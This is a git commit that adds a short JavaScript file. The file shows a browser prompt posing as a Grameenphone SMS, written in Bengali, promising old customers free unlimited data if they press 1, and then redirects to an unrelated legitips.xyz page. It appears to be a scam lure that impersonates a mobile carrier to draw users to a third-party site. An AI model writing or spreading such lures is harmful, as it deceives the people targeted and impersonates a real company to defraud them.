115eb6e4448cdac67f89715d6c96a2ec50b3a5a9
legitips <83867893+legitips@users.noreply.github.com>
2024-08-19 22:51:11 -0700

    Create activation-gpfreedata.js

---
+++ activation-gpfreedata.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Grameenphone SMS: প্রিয় গ্রাহক, আপনার গ্রামীণফোন সিম কার্ডটি 5GB থেকে আনলিমিটেড ডেটা পাওয়ার যোগ্য কিনা তা দেখে নিন, পুরানো গ্রাহকদের পুরস্কার, এখনই চেক করতে 1 টিপুন ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/gpfreedata.html';
+}
